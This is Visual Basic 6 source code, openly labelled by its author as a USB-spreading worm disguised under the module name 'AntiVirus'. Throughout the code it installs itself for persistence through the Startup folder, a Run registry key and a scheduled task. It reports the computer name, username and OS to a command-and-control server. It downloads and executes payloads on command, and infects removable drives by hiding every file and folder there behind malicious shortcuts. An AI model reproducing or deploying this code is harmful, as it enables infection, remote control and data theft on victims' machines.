Attribute VB_Name = "AntiVirus"
Attribute VB_Creatable = False
Attribute VB_GlobalNameSpace = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" _
                        (ByVal lpFileName As String) _
                         As Long

Private Const Splitter As String = "|V|"
Private fs, sh, wr As Object
Private  Vn, Reg, DR, s, sa,bo As String
Private Const RI As String = "HKLM\SOFTWARE\Classes\"
Private Const C As String = "\"

' Author: Suleiman Al-Othman || twitter, github => @sulealothman
' Project : VB6 Worm with USBSpread
' Version: v0.1
Sub Main()
	On Error Resume Next

	DR = "TEMP"
	Reg = "worm"
	Set sh = CreateObject("WScript.Shell")
	Set fs = CreateObject("Scripting.FileSystemObject")
	if mid(app.path & "\" & app.exename,2) = ":\\" & app.exename Then
		bo = sh.regread("HKCU\vsw0rm")
		if bo = "" then
			sh.regwrite "HKCU\vsw0rm", "TRUE", "REG_SZ"
		end if
	Else
		bo = sh.regread("HKCU\vsw0rm")
		if bo = "" then
			sh.regwrite "HKCU\vsw0rm", "FALSE", "REG_SZ"
		end if
	end if

	FileCopy App.Path & C & App.EXEName & ".exe", Environ(DR) & C & App.EXEName & ".exe"
	pthstrup = sh.SpecialFolders("S" & "t" & "a" & "r" & "t" & "u" & "p")
	FileCopy App.Path & C & App.EXEName & ".exe", pthstrup & C & App.EXEName & ".exe"
	sh.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & Reg, Chr(34) & Environ(DR) & C & App.EXEName & ".exe" & Chr(34), "REG_SZ"
	sh.run "schtasks /create /sc minute /mo 30 /tn ScheduleName /tr " & ChrW(34) & Environ(DR) & C & App.EXEName & ".exe", False


	While True
		s = Split(WinPost("av", ""), Splitter)
		Select Case s(0)
			Case "exc"
				sa = s(1)
				s1 = s(2)
				if s1 <> "" then
					s2 = Environ(DR) & C & s1
					  URLDownloadToFile 0, _
					        sa, _
					        s2, 0, 0
					sh.run s2
				end if
				s1 = ""
			Case "Sc"
				sa = s(1)
				s1 = s(2)
				if s1 <> "" then
					s2 = Ex("%" & DR & "%" & C & s1)
					set wr = fs.OpenTextFile(s2, 2, true)
					wr.write sa
					wr.Close
					sh.run s2,6
				end if
				s1 = ""
			Case "Close"
				End
			Case "uns"
				Uns
		End Select
		W.Sleep 7000
		Spr
	Wend
End Sub

Sub Spr()
	On Error Resume Next
	Set sh = CreateObject("WScript.Shell")
	Set fs = CreateObject("Scripting.FileSystemObject")
	For Each x In fs.drives
		If x.isready Then
			If x.FreeSpace > 0 Then
				If x.drivetype = 1 Then
					If fs.fileexists(x.Path & C & App.EXEName & ".exe") Then
						fs.getfile(x.Path & C & App.EXEName & ".exe").Attributes = 0
					End If
					fs.copyfile App.Path & C & App.EXEName & ".exe", x.Path & C & App.EXEName & ".exe", True
					For Each v In fs.GetFolder(x.Path & C).Files
						If InStr(v.Name, ".") Then
							If LCase(Split(v.Name, ".")(UBound(Split(v.Name, ".")))) <> "lnk" Then
								v.Attributes = 2+4
								If UCase(v.Name) <> UCase(App.EXEName & ".exe") Then
									On Error Resume Next
									Set Cre = sh.CreateShortcut(x.Path & C & v.Name & ".lnk")
									Cre.windowstyle = 7
									Cre.targetpath = "cmd.exe"
									Cre.workingDirectory = ""
									Cre.arguments = "/c start " & Replace(App.EXEName & ".exe", " ", ChrW(34) & " " & ChrW(34)) & "&start " & Replace(v.Name, " ", ChrW(34) & " " & ChrW(34)) & "&exit"
									Cre.iconlocation = sh.regread(RI & sh.regread(RI & "." & Split(v.Name, ".")(UBound(Split(v.Name, "."))) & C) & "\DefaultIcon\")
									If InStr(Cre.iconlocation, ",") = 0 Then
										Cre.iconlocation = Cre.iconlocation & ",0"
									End If
									Cre.save
								End If
							End If
						End If
					Next
					For Each sf In fs.GetFolder(x.Path & C).subfolders
						sf.Attributes = 2+4
						On Error Resume Next
						Set Cre = sh.CreateShortcut(x.Path & C & sf.Name & ".lnk")
						Cre.windowstyle = 7
						Cre.targetpath = "cmd.exe"
						Cre.workingDirectory = ""
						Cre.arguments = "/c start " & Replace(App.EXEName & ".exe", " ", ChrW(34) & " " & ChrW(34)) & "&start explorer " & Replace(x.path & C & sf.Name, " ", ChrW(34) & " " & ChrW(34)) & "&exit"
						Cre.iconlocation = sh.regread(RI & "folder" & "\DefaultIcon\")
						If InStr(Cre.iconlocation, ",") = 0 Then
							Cre.iconlocation = Cre.iconlocation & ",0"
						End If
						Cre.save
					Next
				End If
			End If
		End If
	Next

End Sub

Sub Uns()
	On Error Resume Next
	Set sh = CreateObject("WScript.Shell")
	Set fs = CreateObject("Scripting.FileSystemObject")
	pthstrup = sh.SpecialFolders("S" & "t" & "a" & "r" & "t" & "u" & "p")
	DeleteFile pthstrup & C & App.EXEName & ".exe"
	sh.regdelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & Reg
	fs.deletefile Ex("%" & DR & "%") & C & App.EXEName & ".exe"

	Shell "cmd.exe /c ping 0 -n 2 & del """ & App.Path & C & App.EXEName & ".exe" & """", 0
	End
End Sub

Function WinPost(Cmd, Se)
	WinPost = ""
	Set O = CreateObject("Microsoft.XMLHTTP")
	O.Open "POST", "http://127.0.0.1:7778/" & Cmd, False
	O.setRequestHeader "User-Agent:", vInfo
	O.send Se
	WinPost = O.responseText
End Function

Function vInfo()
	Vn = "8TU7U8X"
	vInfo = ""
	s = "??"
	s = Vn
	vInfo = vInfo & s & C
	s = "??"
	s = Ex("%COMPUTERNAME%")
	vInfo = vInfo & s & C
	s = "??"
	s = Ex("%USERNAME%")
	vInfo = vInfo & s & C
	s = "??"
	Set B = GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem")
	For Each A In B
		s = A.Caption
		Exit For
	Next
	vInfo = vInfo & s & C & C
	If Dir(Ex("%windir%") & "\Microsoft.NET\Framework\v2.0.50727\vbc.exe") <> "" Then
		s = "YES"
	Else
		s = "NO"
	End If

	bo = sh.regread("HKCU\vsw0rm")
	vInfo = vInfo & s & C & "0.1" & C & bo & C
End Function

Function Ex(str)
	Set sh = CreateObject("WScript.Shell")
	Ex = sh.ExpandEnvironmentStrings(str)
End Function